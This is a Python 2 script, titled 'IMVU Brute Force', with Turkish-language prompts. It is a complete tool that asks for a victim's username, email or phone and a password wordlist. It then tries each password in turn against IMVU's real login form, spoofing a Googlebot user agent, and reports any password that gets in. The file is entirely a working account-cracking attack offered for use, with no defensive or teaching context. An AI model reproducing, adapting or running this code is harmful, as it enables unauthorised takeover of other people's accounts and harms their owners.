#!usr/bin/python
# -*- coding: utf-8 -*-
import sys
import random
import mechanize
import cookielib
import os

os.system("clear")
class bcolors:
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKBLUE = '\033[94m'

print bcolors.BOLD + ''
print '\t   # IMVU Brute Force'
print '\t   # v1.0~07.09.2016 '
print '\t   # Github: /vicky271'
print '\t   # Twitter:#'
print '\t   # asembagus@gmail.com  PGP: 7ECD8357'
print '' + bcolors.ENDC

email = str(raw_input("[?] Kullanıcı adı | Kullanıcı ID | E-Posta | Telefon numarası :> "))
passwordlist = str(raw_input("[?] Wordlist dosyasının adı :> "))

useragents = [('User-agent', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')]

login = 'https://secure.imvu.com/next/login'
def attack(password):

  try:
     sys.stdout.write("\r [*] Denenen şifre: %s " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)


     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print bcolors.OKGREEN + "\n\n\n [*] Şifre bulundu!." + bcolors.ENDC
        print bcolors.WARNING + "\n [*] Şifre: %s\n" % (password) + bcolors.ENDC
        sys.exit(1)
  except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] Çıkılıyor.. " + bcolors.ENDC
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] Çıkılıyor.. " + bcolors.ENDC
        sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print bcolors.FAIL + "\n [!] Hata: Wordlist dosyası bulunamadı! \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] Çıkılıyor..\n " + bcolors.ENDC
        sys.exit(1)
    try:
        print bcolors.OKBLUE + " [*] Hesap bilgisi : %s" % (email) + bcolors.ENDC
        print " [*] Şifre sayısı :" , len(passwords), "passwords"
        print " [*] Üzerinde çalışılıyor, Lütfen bekleyin .."
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] Çıkılıyor..\n " + bcolors.ENDC
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] Çıkılıyor..\n " + bcolors.ENDC
        sys.exit(1)

if __name__ == '__main__':
    check()
